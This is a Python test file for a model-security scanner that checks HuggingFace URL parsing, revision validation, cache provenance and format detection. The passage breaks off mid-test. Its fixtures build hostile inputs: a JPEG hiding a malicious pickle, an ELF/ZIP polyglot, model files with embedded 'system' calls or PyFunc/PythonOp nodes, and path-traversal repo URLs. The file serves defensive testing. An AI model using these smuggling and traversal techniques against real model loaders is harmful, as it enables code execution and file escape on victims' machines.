"""Tests for HuggingFace URL handling."""

import gzip
import hashlib
import importlib
import json
import os
import pickle
import signal
import struct
import subprocess
import sys
import tarfile
import tempfile
import textwrap
import time
import zipfile
import zlib
from collections.abc import Callable, Iterator
from io import BytesIO
from pathlib import Path, PurePosixPath, PureWindowsPath
from types import SimpleNamespace
from typing import Any, cast
from unittest.mock import ANY, MagicMock, call, patch

import pytest

from modelaudit.core import determine_exit_code, scan_model_directory_or_file, scan_model_streaming
from modelaudit.scanner_selection import (
    resolve_scanner_selection_policy,
    scanner_ids_for_detected_format,
    selected_scanner_extensions,
    selected_scanner_filenames,
)
from modelaudit.utils.file.detection import (
    _CONTENT_ROUTE_DECLARED_TEXT_FAST_PATH_BYTES,
    _CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES,
    FLAX_MSGPACK_STRUCTURE_READ_BYTES,
    MEDIA_ROUTE_TAIL_READ_BYTES,
    PICKLE_ROUTING_INCONCLUSIVE_FORMAT,
    SAFETENSORS_ROUTING_HEADER_PARSE_BYTES,
    detect_file_format_for_skip_filter,
)
from modelaudit.utils.file.hdf5 import HDF5_MAGIC, hdf5_metadata_checksum
from modelaudit.utils.file.streaming import StreamedSourceByteAccounting
from modelaudit.utils.sources._huggingface_download_worker import _run_operation as _run_huggingface_worker_operation
from modelaudit.utils.sources.huggingface import (
    _HF_ACQUIRED_SAFETENSORS_INDEX_BASENAME,
    _HF_CONTENT_SNIFF_BYTES,
    _HF_CONTENT_SNIFF_MAX_FILES,
    _HF_SAFETENSORS_INDEX_MAX_FILES,
    _HF_SAFETENSORS_RESULT_BUDGET_FAILURE_RESERVE_BYTES,
    _HF_SAFETENSORS_RESULT_BUDGET_REASON,
    _MAX_HF_REPOSITORY_PATH_CHARS,
    _MAX_HF_SAFETENSORS_RETAINED_RESULT_BYTES,
    _MAX_HF_SAFETENSORS_RETAINED_RESULTS,
    _MAX_HF_SAFETENSORS_RETAINED_TENSOR_NAMES,
    _build_huggingface_filtered_download_path,
    _build_huggingface_model_info,
    _check_hf_acquisition_interrupted,
    _combine_remote_safetensors_shard_details,
    _detect_huggingface_content_route_format,
    _detect_huggingface_flax_msgpack_route,
    _discover_hf_onnx_external_data_files,
    _extract_huggingface_repo_files,
    _get_huggingface_path_sizes,
    _HuggingFaceProbeBudget,
    _HuggingFaceSafeTensorsRetentionBudget,
    _list_huggingface_repo_files_at_revision,
    _list_repo_files_with_timeout,
    _loads_json_without_duplicate_keys,
    _private_huggingface_acquired_index_candidate,
    _range_response_validator,
    _read_huggingface_prefix,
    _read_huggingface_strict_range,
    _remote_safetensors_filename_shard_details_by_file,
    _remote_safetensors_index_details_by_file,
    _remote_safetensors_index_failure_result,
    _remote_safetensors_result_budget_failure_result,
    _run_huggingface_download_with_deadline,
    _scan_remote_huggingface_safetensors_header,
    _select_streamable_hf_files,
    _tensor_name_digest,
    _terminate_huggingface_download_process,
    _validate_huggingface_repo_filename,
    _validate_remote_safetensors_indexes,
    download_file_from_hf,
    download_model,
    download_model_streaming,
    extract_model_id_from_path,
    get_model_info,
    get_model_size,
    is_huggingface_cache_path,
    is_huggingface_file_url,
    is_huggingface_url,
    parse_huggingface_file_url,
    parse_huggingface_url,
    parse_huggingface_url_with_revision,
    plan_huggingface_model_download,
    plan_huggingface_streaming_download,
    redact_huggingface_url_for_display,
)
from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs
from tests.helpers import create_mock_coreml, create_mock_onnx
from tests.helpers.file_creators import malicious_pickle_bytes, valid_jpeg_bytes, valid_png_bytes

_HF_TEST_REVISION = "a" * 40
_MINIMAL_ONNX_MODEL_PROTO = b"\x08\x08"  # Parseable ModelProto with ir_version=8 and no external data.


@pytest.fixture(autouse=True)
def _trusted_system_temp_anchor(monkeypatch: pytest.MonkeyPatch) -> None:
    """Model the normal root-owned sticky system temp directory on this non-sticky test host."""
    from modelaudit.utils.sources import huggingface as huggingface_module

    if os.name == "nt":
        monkeypatch.setattr(huggingface_module, "_filtered_huggingface_cache_trust_supported", lambda: True)
        return
    original_stat = huggingface_module._stat_huggingface_cache_path
    system_temp = Path(tempfile.gettempdir()).resolve()

    def stat_with_sticky_system_temp(path: Path) -> os.stat_result:
        result = original_stat(path)
        if path.absolute() != system_temp:
            return result
        values = list(result)
        values[0] = result.st_mode | 0o1000
        return os.stat_result(values)

    monkeypatch.setattr(huggingface_module, "_stat_huggingface_cache_path", stat_with_sticky_system_temp)


def test_hf_acquisition_interrupt_check_honors_global_cancel_and_deadline(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from modelaudit.utils.sources import huggingface as huggingface_module

    interrupt_checks = 0

    def track_interrupt() -> None:
        nonlocal interrupt_checks
        interrupt_checks += 1

    monkeypatch.setattr(huggingface_module, "check_interrupted", track_interrupt)
    monkeypatch.setattr(huggingface_module.time, "monotonic", lambda: 10.0)

    with pytest.raises(TimeoutError, match="acquisition timed out"):
        _check_hf_acquisition_interrupted("test/model", 10.0)
    assert interrupt_checks == 1


def _bert_vocab_payload(min_bytes: int = 16 * 1024) -> bytes:
    tokens = ["[PAD]", "[UNK]", "[CLS]", "[SEP]", "[MASK]"]
    tokens.extend(f"[unused{index}]" for index in range(2048))
    tokens.extend(f"token_{index}" for index in range(2048))
    payload = ("\n".join(tokens) + "\n").encode("utf-8")
    assert len(payload) > min_bytes
    return payload


def _bpe_merges_payload(min_bytes: int = 3 * 1024 * 1024) -> bytes:
    lines = ["#version: 0.2"]
    total_bytes = len(lines[0]) + 1
    index = 0
    while total_bytes <= min_bytes:
        line = f"token_{index % 8192} token_{(index * 17) % 8192}"
        lines.append(line)
        total_bytes += len(line) + 1
        index += 1
    return ("\n".join(lines) + "\n").encode("utf-8")


class _FakeRangeResponse:
    def __init__(
        self,
        payload: bytes,
        *,
        headers: dict[str, str] | None = None,
        status_code: int = 200,
        url: str = "https://huggingface.co/test/model/resolve/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/model.bin",
    ) -> None:
        self.payload = payload
        self.headers = headers if headers is not None else {"Content-Length": str(len(payload))}
        self.status_code = status_code
        self.url = url

    def __enter__(self) -> "_FakeRangeResponse":
        return self

    def __exit__(self, *_exc_info: object) -> None:
        return None

    def raise_for_status(self) -> None:
        return None

    def close(self) -> None:
        return None

    def iter_content(self, chunk_size: int) -> Iterator[bytes]:
        yield self.payload[:chunk_size]


def _large_remote_documentation_payload(label: str) -> bytes:
    line = f"{label} line-oriented documentation with tokenizer notes and multilingual text café.\n".encode()
    payload = f"# {label}\n".encode() + line * ((_CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES // len(line)) + 128)
    assert len(payload) > _CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES
    assert len(payload) < _CONTENT_ROUTE_DECLARED_TEXT_FAST_PATH_BYTES
    return payload


class _FakeTreeResponse:
    def __init__(
        self,
        payload: object,
        links: dict[str, dict[str, str]] | None = None,
        headers: dict[str, str] | None = None,
    ) -> None:
        self.payload = payload
        self.raw_payload = json.dumps(payload).encode("utf-8")
        self.links = links or {}
        self.headers = headers if headers is not None else {"Content-Length": str(len(self.raw_payload))}

    def __enter__(self) -> "_FakeTreeResponse":
        return self

    def __exit__(self, *_exc_info: object) -> None:
        return None

    def raise_for_status(self) -> None:
        return None

    def json(self) -> object:
        return self.payload

    def iter_content(self, chunk_size: int) -> Iterator[bytes]:
        for start in range(0, len(self.raw_payload), chunk_size):
            yield self.raw_payload[start : start + chunk_size]

    def iter_bytes(self, chunk_size: int) -> Iterator[bytes]:
        yield from self.iter_content(chunk_size)


def _fake_content_range_response(payload: bytes, start: int, end: int) -> _FakeRangeResponse:
    return _FakeRangeResponse(
        payload[start : end + 1],
        headers={"Content-Range": f"bytes {start}-{end}/{len(payload)}"},
        status_code=206,
    )


def _fake_range_responder(payload: bytes) -> Callable[[str], _FakeRangeResponse]:
    def get_response(_url: str, **kwargs: object) -> _FakeRangeResponse:
        headers = cast(dict[str, str], kwargs.get("headers", {}))
        range_header = headers.get("Range", "")
        if range_header.startswith("bytes="):
            start_text, end_text = range_header.removeprefix("bytes=").split("-", 1)
            start = int(start_text)
            end = min(int(end_text), len(payload) - 1)
            return _fake_content_range_response(payload, start, end)
        return _FakeRangeResponse(payload)

    return get_response


def _make_tar_payload() -> bytes:
    payload = BytesIO()
    with tarfile.open(fileobj=payload, mode="w") as archive:
        info = tarfile.TarInfo("weights.bin")
        info.size = len(b"weights")
        info.mtime = 0
        archive.addfile(info, BytesIO(b"weights"))
    return payload.getvalue()


def _make_executable_zip_polyglot_payload() -> bytes:
    payload = BytesIO()
    with zipfile.ZipFile(payload, "w") as archive:
        archive.writestr("model.pkl", b"payload")
    return b"\x7fELF" + b"\x02\x01\x01\x00" + (b"\x00" * 56) + payload.getvalue()


def _png_chunk(chunk_type: bytes, payload: bytes) -> bytes:
    checksum = zlib.crc32(chunk_type + payload) & 0xFFFFFFFF
    return len(payload).to_bytes(4, "big") + chunk_type + payload + checksum.to_bytes(4, "big")


def _make_large_valid_png_payload() -> bytes:
    png = valid_png_bytes()
    text_chunk = _png_chunk(b"tEXt", b"Comment\x00" + (b"x" * MEDIA_ROUTE_TAIL_READ_BYTES))
    return png[:-12] + text_chunk + png[-12:]


def _make_forged_png_tail_payload() -> bytes:
    png = valid_png_bytes()
    oversized_idat_header = (10 * 1024 * 1024).to_bytes(4, "big") + b"IDAT"
    padding = b"\0" * (MEDIA_ROUTE_TAIL_READ_BYTES + 32)
    return png[:33] + oversized_idat_header + padding + png[-12:]


def _make_invalid_png_crc_payload() -> bytes:
    payload = bytearray(valid_png_bytes())
    payload[-1] ^= 0x01
    return bytes(payload)


def _make_forged_jpeg_tail_payload() -> bytes:
    app0_header = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    prefix_padding = b"\0" * ((8 * 1024) - len(app0_header))
    tail_padding = b"\0" * (MEDIA_ROUTE_TAIL_READ_BYTES + 32)
    return app0_header + prefix_padding + malicious_pickle_bytes() + tail_padding + b"\xff\xd9" + b"\0" * 8


def _make_large_valid_jpeg_payload() -> bytes:
    app0_header = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    scan_header = b"\xff\xda\x00\x08\x01\x01\x00\x00?\x00"
    entropy = b"\x11" * ((8 * 1024) + MEDIA_ROUTE_TAIL_READ_BYTES)
    return app0_header + scan_header + entropy + b"\xff\xd9"


def _make_printable_utf8_messagepack_candidate() -> bytes:
    return (b'""' + ("é" * 17).encode("utf-8")) * 4097


def _make_line_broken_printable_utf8_messagepack_candidate() -> bytes:
    return (b'""' + ("é" * 17).encode("utf-8") + b"\n") * 4097


def _ubjson_key(key: bytes) -> bytes:
    return b"U" + bytes([len(key)]) + key


def _ubjson_string(value: bytes) -> bytes:
    return b"SL" + len(value).to_bytes(8, byteorder="big", signed=True) + value


def _make_xgboost_ubjson_payload(*, malicious: bool = False) -> bytes:
    learner_body = _ubjson_key(b"learner_model_param") + b"{}"
    if malicious:
        learner_body += _ubjson_key(b"malicious_code") + _ubjson_string(b"system(cpu)")
    return b"{" + _ubjson_key(b"learner") + b"{" + learner_body + b"}" + _ubjson_key(b"version") + b"[]" + b"}"


def _make_safetensors_frame(header: dict[str, object], data: bytes) -> tuple[bytes, int]:
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    return struct.pack("<Q", len(header_bytes)) + header_bytes + data, len(header_bytes)


def _make_padded_safetensors_frame(header_length: int, note: str) -> bytes:
    header = json.dumps(
        {
            "__metadata__": {"note": note},
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
        },
        separators=(",", ":"),
    ).encode()
    assert len(header) <= header_length
    return struct.pack("<Q", header_length) + header + (b" " * (header_length - len(header))) + b"\x00"


def _embed_plausible_hdf5_superblock(payload: bytes, signature_offset: int) -> bytes:
    output = bytearray(payload)
    minimum_size = signature_offset + 64
    if len(output) < minimum_size:
        output.extend(bytes(minimum_size - len(output)))
    superblock = bytearray(HDF5_MAGIC + b"\x03\x08\x08\x00")
    superblock.extend(signature_offset.to_bytes(8, "little"))
    superblock.extend(b"\xff" * 8)
    superblock.extend(len(output).to_bytes(8, "little"))
    superblock.extend((signature_offset + 48).to_bytes(8, "little"))
    superblock.extend(hdf5_metadata_checksum(bytes(superblock)).to_bytes(4, "little"))
    output[signature_offset : signature_offset + len(superblock)] = superblock
    return bytes(output)


def _strict_range_response(
    payload: bytes,
    total_size: int,
    *,
    url: str | None = None,
    start_offset: int = 0,
) -> _FakeRangeResponse:
    return _FakeRangeResponse(
        payload,
        headers={
            "Content-Range": f"bytes {start_offset}-{start_offset + len(payload) - 1}/{total_size}",
            "Content-Length": str(len(payload)),
            "ETag": '"stable"',
        },
        status_code=206,
        url=url or "https://huggingface.co/test/model/resolve/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/model.bin",
    )


def _fake_remote_safetensors_scan(filename: str, declared_size: int = 500) -> Any:
    from modelaudit.scanner_results import ScanResult

    result = ScanResult(scanner_name="safetensors")
    result.metadata.update(
        {
            "source_path": f"hf://test/model@{_HF_TEST_REVISION}/{filename}",
            "hf_repo_id": "test/model",
            "hf_revision": _HF_TEST_REVISION,
            "hf_filename": filename,
            "file_size": declared_size,
            "remote_declared_size": declared_size,
            "remote_bytes_transferred": 64,
            "remote_header_only": True,
            "tensor_payload_bytes_downloaded": 0,
        }
    )
    result.bytes_scanned = 64
    result.finish(success=True)
    return result


def _unpack_internal_stream_item(item: object) -> tuple[Path, bool, Any, StreamedSourceByteAccounting]:
    """Normalize trusted internal stream tuples for assertions."""
    if not isinstance(item, tuple):
        raise AssertionError(f"expected streamed tuple, got {type(item).__name__}")
    if len(item) == 4:
        path, is_last, scan_result, accounting = item
        assert isinstance(accounting, StreamedSourceByteAccounting)
        return Path(path), bool(is_last), scan_result, accounting
    if len(item) == 3:
        path, is_last, scan_result = item
        return Path(path), bool(is_last), scan_result, StreamedSourceByteAccounting()
    if len(item) == 2:
        path, is_last = item
        return Path(path), bool(is_last), None, StreamedSourceByteAccounting()
    raise AssertionError(f"unexpected streamed tuple length: {len(item)}")


def _make_tensorflow_savedmodel_payload(_tmp_path: Path) -> bytes:
    if not has_tensorflow_protobuf_stubs():
        pytest.skip("TensorFlow protobuf stubs unavailable")
    import modelaudit.protos  # noqa: F401

    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
    saved_model = saved_model_pb2.SavedModel()
    saved_model.saved_model_schema_version = 1
    node = saved_model.meta_graphs.add().graph_def.node.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    return cast(bytes, saved_model.SerializeToString())


def _make_coreml_payload(tmp_path: Path) -> bytes:
    return create_mock_coreml(tmp_path / "fixture.mlmodel").read_bytes()


def _make_onnx_payload(tmp_path: Path) -> bytes:
    pytest.importorskip("onnx")
    return create_mock_onnx(tmp_path / "fixture.onnx", op_type="PythonOp").read_bytes()


def _make_external_onnx_payload(tmp_path: Path, external_path: str = "model.onnx_data") -> bytes:
    onnx = pytest.importorskip("onnx")
    from onnx import TensorProto, helper
    from onnx.onnx_ml_pb2 import StringStringEntryProto

    tensor = helper.make_tensor("W", TensorProto.FLOAT, [1], vals=[1.0])
    tensor.data_location = onnx.TensorProto.EXTERNAL
    entry = StringStringEntryProto()
    entry.key = "location"
    entry.value = external_path
    tensor.external_data.append(entry)
    graph = helper.make_graph(
        [helper.make_node("Relu", ["input"], ["output"], name="relu")],
        "external_data_graph",
        [helper.make_tensor_value_info("input", TensorProto.FLOAT, [1])],
        [helper.make_tensor_value_info("output", TensorProto.FLOAT, [1])],
        initializer=[tensor],
    )
    model_path = tmp_path / "fixture.onnx"
    onnx.save(helper.make_model(graph), str(model_path))
    return model_path.read_bytes()


def test_hf_onnx_sidecar_discovery_reports_bounded_parse_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from modelaudit.scanners import onnx_scanner

    onnx_path = tmp_path / "model.onnx"
    onnx_path.write_bytes(_make_external_onnx_payload(tmp_path))

    def fail_bounded_discovery(*_args: Any, **_kwargs: Any) -> Any:
        raise onnx_scanner._OnnxStructureParseError(
            "retained_object_limit_exceeded",
            "bounded discovery exhausted its retained-object budget",
        )

    monkeypatch.setattr(onnx_scanner, "_load_onnx_structure_file_backed", fail_bounded_discovery)

    with pytest.raises(
        ValueError,
        match=r"ONNX external_data coverage incomplete.*retained_object_limit_exceeded",
    ):
        _discover_hf_onnx_external_data_files(
            onnx_path,
            "model.onnx",
            {"model.onnx", "model.onnx_data"},
        )


def test_hf_onnx_sidecar_discovery_checks_deadline_during_no_tensor_graph_traversal(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from modelaudit.scanners import onnx_scanner

    onnx = pytest.importorskip("onnx")
    onnx_path = tmp_path / "model.onnx"
    onnx_path.write_bytes(_make_external_onnx_payload(tmp_path))
    parsed_model = onnx.load_model_from_string(onnx_path.read_bytes())
    parsed_model.graph.ClearField("initializer")
    callback_invocations = 0

    def check_deadline() -> None:
        nonlocal callback_invocations
        callback_invocations += 1
        if callback_invocations == 2:
            raise TimeoutError("enumeration deadline reached")

    def load_without_invoking_callback(
        _path: str,
        _file_size: int,
        interrupt_check: Any,
        *,
        expected_stat: os.stat_result,
    ) -> Any:
        assert interrupt_check is check_deadline
        assert expected_stat.st_size == onnx_path.stat().st_size
        return parsed_model, object()

    monkeypatch.setattr(onnx_scanner, "_load_onnx_structure_file_backed", load_without_invoking_callback)

    with pytest.raises(TimeoutError, match="enumeration deadline reached"):
        _discover_hf_onnx_external_data_files(
            onnx_path,
            "model.onnx",
            {"model.onnx", "model.onnx_data"},
            check_deadline,
        )
    assert callback_invocations == 2


TEST_COMMIT_SHA = "a" * 40


class TestHuggingFaceURLDetection:
    """Test HuggingFace URL detection."""

    def test_valid_huggingface_urls(self):
        """Test that valid HuggingFace URLs are detected."""
        valid_urls = [
            "https://huggingface.co/bert-base-uncased",
            "https://huggingface.co/gpt2/model",
            "https://hf.co/facebook/bart-large",
            "hf://llama/llama-7b",
            "http://huggingface.co/test/model",
            "https://user:pass@huggingface.co/test/model?token=hf_secret",
        ]
        for url in valid_urls:
            assert is_huggingface_url(url), f"Failed to detect valid URL: {url}"

    def test_invalid_huggingface_urls(self):
        """Test that invalid URLs are not detected as HuggingFace URLs."""
        invalid_urls = [
            "https://github.com/user/repo",
            "https://example.com/model",
            "/path/to/local/file",
            "file:///path/to/file",
            "s3://bucket/key",
            "",
            "huggingface.co/model",  # Missing protocol
        ]
        for url in invalid_urls:
            assert not is_huggingface_url(url), f"Incorrectly detected invalid URL: {url}"


class TestHuggingFaceURLParsing:
    """Test HuggingFace URL parsing."""

    def test_parse_https_urls(self):
        """Test parsing HTTPS HuggingFace URLs."""
        test_cases = [
            ("https://huggingface.co/bert-base/uncased", ("bert-base", "uncased")),
            ("https://hf.co/facebook/bart-large", ("facebook", "bart-large")),
            ("https://huggingface.co/user/model/", ("user", "model")),
        ]
        for url, expected in test_cases:
            namespace, repo = parse_huggingface_url(url)
            assert (namespace, repo) == expected, f"Failed to parse {url}"

    def test_parse_hf_protocol_urls(self):
        """Test parsing hf:// protocol URLs."""
        test_cases = [
            ("hf://bert-base/uncased", ("bert-base", "uncased")),
            ("hf://facebook/bart-large", ("facebook", "bart-large")),
            ("hf://user/model/", ("user", "model")),
            (f"hf://user/model?revision={_HF_TEST_REVISION}", ("user", "model")),
        ]
        for url, expected in test_cases:
            namespace, repo = parse_huggingface_url(url)
            assert (namespace, repo) == expected, f"Failed to parse {url}"

    def test_parse_single_component_urls(self):
        """Test parsing single-component URLs (models without namespaces)."""
        test_cases = [
            ("https://huggingface.co/gpt2", ("gpt2", "")),
            ("https://hf.co/bert-base-uncased", ("bert-base-uncased", "")),
            ("hf://gpt2", ("gpt2", "")),
            ("hf://bert-base-uncased", ("bert-base-uncased", "")),
        ]
        for url, expected in test_cases:
            namespace, repo = parse_huggingface_url(url)
            assert (namespace, repo) == expected, f"Failed to parse {url}"

    @pytest.mark.parametrize(
        ("url", "expected"),
        [
            ("https://huggingface.co/org/repo?revision=main", ("org", "repo", "main")),
            ("https://hf.co/org/repo?revision=refs%2Fpr%2F1", ("org", "repo", "refs/pr/1")),
            ("hf://org/repo?revision=refs%2Fpr%2F1", ("org", "repo", "refs/pr/1")),
            ("hf://gpt2?revision=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", ("gpt2", "", "a" * 40)),
        ],
    )
    def test_parse_urls_with_revision_query(self, url: str, expected: tuple[str, str, str]) -> None:
        """Repository URLs should preserve explicit requested revisions."""
        assert parse_huggingface_url_with_revision(url) == expected
        assert parse_huggingface_url(url) == expected[:2]

    def test_parse_urls_accepts_duplicate_matching_revision_query(self) -> None:
        """Repeated matching revision parameters are redundant, not ambiguous."""
        assert parse_huggingface_url_with_revision("https://huggingface.co/org/repo?revision=main&revision=main") == (
            "org",
            "repo",
            "main",
        )

    @pytest.mark.parametrize(
        "url",
        [
            "https://huggingface.co/org/repo?revision=",
            "https://huggingface.co/org/repo?revision=main&revision=dev",
            "https://huggingface.co/org/repo?revision=..",
            "hf://org/repo?revision=refs%2F..%2Fescape",
        ],
    )
    def test_parse_urls_rejects_invalid_revision_query(self, url: str) -> None:
        """Ambiguous or unsafe revision query values must fail before SDK calls."""
        with pytest.raises(ValueError):
            parse_huggingface_url_with_revision(url)

    def test_parse_invalid_urls(self):
        """Test that invalid URLs raise ValueError."""
        invalid_urls = [
            "https://github.com/user/repo",
            "hf://",  # Empty path
            "",  # Empty string
        ]
        for url in invalid_urls:
            with pytest.raises(ValueError):
                parse_huggingface_url(url)

    @pytest.mark.parametrize(
        "url",
        [
            "https://huggingface.co/%2e%2e/model",
            "https://huggingface.co/org/%2e%2e",
            "https://huggingface.co/org/repo%2F..%2Fescape",
            "hf://org%2F..%2Fescape/model",
            "hf://org/repo%5Cescape",
        ],
    )
    def test_parse_rejects_unsafe_repo_components(self, url: str) -> None:
        """Decoded repo-id components must not become path traversal segments."""
        with pytest.raises(ValueError):
            parse_huggingface_url(url)

        assert is_huggingface_url(url) is False


class TestExtractModelIdFromPath:
    """Test HuggingFace model ID extraction from local paths."""

    @pytest.mark.parametrize(
        ("url", "model_id"),
        [
            ("https://huggingface.co/gpt2/resolve/main/config.json", "gpt2"),
            ("https://huggingface.co/user/repo/resolve/refs%2Fpr%2F1/model.bin", "user/repo"),
        ],
    )
    def test_extract_model_id_from_direct_file_url(self, url: str, model_id: str) -> None:
        """Direct file URLs should retain their repository provenance."""
        assert extract_model_id_from_path(url) == (model_id, "huggingface")

    def test_extract_model_id_from_local_config(self, tmp_path: Path) -> None:
        """Local config metadata should still be extracted as local provenance."""
        model_dir = tmp_path / "model"
        model_dir.mkdir()
        model_path = model_dir / "weights.bin"
        model_path.write_bytes(b"weights")
        (model_dir / "config.json").write_text('{"_name_or_path": "Qwen/Qwen2.5-0.5B"}')

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "local")

    def test_extract_model_id_from_hf_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Local HuggingFace cache paths should use distinct cache provenance."""
        hf_home = tmp_path / ".cache" / "huggingface"
        monkeypatch.setenv("HF_HOME", str(hf_home))
        model_path = hf_home / "hub" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_extract_model_id_from_hf_home_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """HF_HOME relocation should still be recognized as HuggingFace cache provenance."""
        monkeypatch.setenv("HF_HOME", str(tmp_path / "custom-hf-home"))
        model_path = (
            tmp_path / "custom-hf-home" / "hub" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        )
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_extract_model_id_from_symlinked_hf_home_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Resolved cache roots should still match paths reached through symlinked HF_HOME."""
        real_home = tmp_path / "real-hf-home"
        link_home = tmp_path / "link-hf-home"
        real_home.mkdir()
        try:
            link_home.symlink_to(real_home, target_is_directory=True)
        except OSError as exc:
            pytest.skip(f"symlink creation unavailable: {exc}")

        monkeypatch.setenv("HF_HOME", str(link_home))
        model_path = link_home / "hub" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_extract_model_id_from_hf_hub_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """HF_HUB_CACHE relocation should override the default HuggingFace cache root."""
        monkeypatch.setenv("HF_HOME", str(tmp_path / "ignored-home"))
        monkeypatch.setenv("HF_HUB_CACHE", str(tmp_path / "custom-hub-root"))
        model_path = (
            tmp_path / "custom-hub-root" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        )
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_hf_cache_path_resolution_handles_symlink_loop(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        requires_symlinks: None,
    ) -> None:
        """Looped cache symlinks should not abort HuggingFace cache provenance checks."""
        hf_home = tmp_path / "hf-home"
        monkeypatch.setenv("HF_HOME", str(hf_home))
        model_root = hf_home / "hub" / "models--Qwen--Qwen2.5-0.5B"
        model_root.mkdir(parents=True)
        loop_path = model_root / "snapshots"
        loop_path.symlink_to(loop_path, target_is_directory=True)

        looped_metadata_path = loop_path / "abc123" / "model.metadata"

        assert is_huggingface_cache_path(looped_metadata_path) is True

    def test_extract_model_id_rejects_spoofed_models_directory(self, tmp_path: Path) -> None:
        """A local models--* directory without HF cache layout should not be treated as HuggingFace."""
        model_path = tmp_path / "models--Qwen--Qwen2.5-0.5B" / "weights.bin"
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == (None, None)

    def test_extract_model_id_rejects_spoofed_hf_cache_root(self, tmp_path: Path) -> None:
        """Only the real .cache/huggingface/hub layout should count as HF cache provenance."""
        model_path = (
            tmp_path
            / "project"
            / "huggingface"
            / "hub"
            / "models--Qwen--Qwen2.5-0.5B"
            / "snapshots"
            / "abc123"
            / "weights.bin"
        )
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == (None, None)


class TestModelDownload:
    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "nested/adapter/model.safetensors.index.json",
                "nested/adapter/model-00000-of-00002.safetensors",
                "nested/adapter/model-00001-of-00002.safetensors",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_materializes_zero_based_safetensors_index_family(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Snapshot selection should keep nested zero-based indexed SafeTensors complete."""
        index_payload = json.dumps(
            {
                "weight_map": {
                    "a": "model-00000-of-00002.safetensors",
                    "b": "model-00001-of-00002.safetensors",
                }
            }
        ).encode()
        download_path = tmp_path / "download"
        nested_dir = download_path / "nested" / "adapter"
        nested_dir.mkdir(parents=True)
        for filename in (
            "model.safetensors.index.json",
            "model-00000-of-00002.safetensors",
            "model-00001-of-00002.safetensors",
        ):
            (nested_dir / filename).write_bytes(b"{}" if filename.endswith(".json") else b"weights")
        mock_requests_get.return_value = _FakeRangeResponse(index_payload)
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == [
            "nested/adapter/model-00000-of-00002.safetensors",
            "nested/adapter/model-00001-of-00002.safetensors",
            "nested/adapter/model.safetensors.index.json",
        ]

    @pytest.mark.parametrize(
        "index_name",
        ["MODEL.SAFETENSORS.INDEX.JSON", "weights.safetensors.index.json"],
        ids=["uppercase", "prefixed"],
    )
    def test_downloaded_noncanonical_safetensors_index_retains_local_authority(
        self,
        tmp_path: Path,
        index_name: str,
    ) -> None:
        """Remote-accepted index identity must govern the materialized local family."""
        shard_name = "model-00000-of-00001.safetensors"
        repo_files = [index_name, shard_name]
        index_payload = json.dumps({"weight_map": {"tensor": shard_name}}).encode()
        header = b'{"__metadata__":{"format":"pt"}}'
        shard_payload = struct.pack("<Q", len(header)) + header

        def snapshot_side_effect(*, local_dir: str, **_kwargs: object) -> str:
            download_path = Path(local_dir)
            download_path.mkdir(parents=True, exist_ok=True)
